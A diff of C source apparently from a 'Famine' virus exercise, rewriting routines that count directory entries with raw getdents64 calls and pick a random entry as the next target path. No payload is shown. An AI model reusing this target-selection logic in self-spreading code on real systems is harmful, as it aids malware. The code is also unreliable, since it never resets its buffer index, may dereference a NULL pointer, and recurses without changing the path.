@@ -1,10 +1,10 @@
 #include <famine.h>
 
 ////////////////////////////////////////////////////////////////////////////////
-/// STATIC FUNCTIONS
+/// STATIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-static inline void update_path(char *path, const char *file)
+static inline void update_to_absolute_path(char *path, const char *file)
 {
 	const size_t p_limit = _strlen(path);
 	const size_t f_limit = _strlen(file);
@@ -15,46 +15,70 @@ static inline void update_path(char *path, const char *file)
 		path[p_limit + index] = file[index];
 }
 
-static inline void update_entry(struct directory *dir, const char *dirent)
-{
-	size_t index = 0;
-	size_t reclen = 0;
-
-	while (dirent[index])
-	{
-		reclen = ((struct linux_dirent64 *)(dirent + index))->d_reclen;
-		index += reclen;
-		dir->entry += 1;
-	}
-}
-
 ////////////////////////////////////////////////////////////////////////////////
-/// PUBLIC FUNCTION
+/// PUBLIC FUNCTIONS
 ////////////////////////////////////////////////////////////////////////////////
 
-int8_t update_directory(struct directory *dir, const char *dirent)
+int8_t update_entry(struct directory *dir)
 {
+	int fd = 0;
 	size_t index = 0;
-	size_t entry = 0;
-	size_t reclen = 0;
+	size_t limit = 0;
+	struct linux_dirent64 *dirp;
+	char buf[BUFF_SIZE];
 
-	update_entry(dir, dirent);
-
-	if (dir->entry == 0)
+	if ((fd = _open(dir->path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
 		return FAILURE;
 
-	const size_t r_entry = _get_random_integer(dir->entry);
-
-	while (dirent[index])
+	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
 	{
-		if (entry == r_entry)
-			break ;
-		reclen = ((struct linux_dirent64 *)(dirent + index))->d_reclen;
-		index += reclen;
-		entry += 1;
+		while (index < limit)
+		{
+			dirp = (struct linux_dirent64 *)(buf + index);
+			index += dirp->d_reclen;
+			dir->entry += 1;
+		}
 	}
 
-	update_path(dir->path, ((struct linux_dirent64 *)(dirent + index))->d_name);
+	_close(fd);
+
+	return SUCCESS;
+}
+
+int8_t update_path(struct directory *dir)
+{
+	int fd = 0;
+	size_t index = 0;
+	size_t limit = 0;
+	size_t r_entry = 0;
+	struct linux_dirent64 *dirp = NULL;
+	char buf[BUFF_SIZE];
+
+	if ((fd = _open(dir->path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
+		return FAILURE;
+
+	r_entry = _get_random_integer(dir->entry);
+
+	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
+	{
+		while (index < limit)
+		{
+			dirp = (struct linux_dirent64 *)(buf + index);
+
+			if (r_entry == 0)
+				break ;
+
+			index += dirp->d_reclen;
+			r_entry -= 1;
+		}
+	}
+
+	_close(fd);
+
+	if (dirp->d_name[0] == '.')
+		update_path(dir);
+	else
+		update_to_absolute_path(dir->path, dirp->d_name);
 
 	return SUCCESS;
 }
